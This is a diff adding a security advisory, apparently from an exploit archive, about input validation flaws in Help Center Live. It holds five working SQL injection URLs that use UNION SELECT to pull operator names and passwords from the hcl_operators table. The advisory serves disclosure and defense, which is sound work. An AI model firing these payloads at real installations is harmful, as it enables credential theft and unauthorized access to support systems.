@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/13666/info
+
+Help Center Live is prone to multiple input validation vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+
+Reportedly the application is affected by multiple HTML injection vulnerabilities. Attacker-supplied HTML and script code would be able to access properties of the site, potentially allowing for theft of cookie-based authentication credentials. An attacker could also exploit this issue to control how the site is rendered to the user; other attacks are also possible.
+
+The application is also affected by multiple SQL injection vulnerabilities. Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.
+
+These issues have reportedly been addressed in the latest release of Help Center Live, this information has not been confirmed by Symantec or the vendor. 
+
+http://www.example.com/support/faq/index.php?x=f&id=-99'%20UNION%20SELECT%200,
+0,operator,password%20FROM%20hcl_operators%20WHERE%201/*
+
+http://www.example.com/support/tt/view.php?tid=-99'%20UNION%20SELECT%200,0,0,
+operator,password,0,0,0,0,0%20FROM%20hcl_operators%20WHERE%201/*
+
+http://www.example.com/support/tt/download.php?fid=-99'%20UNION%20SELECT%200,0,0,
+password,0,operator,0,0%20FROM%20hcl_operators%20WHERE%20id='1
+
+http://www.example.com/support/lh/icon.php?status=-99' UNION SELECT
+password,password FROM hcl_operators WHERE id=1/*
+
+http://www.example.com/support/lh/chat_download.php?fid=-99' UNION
+SELECT password,operator,password FROM hcl_operators WHERE id=1/* 
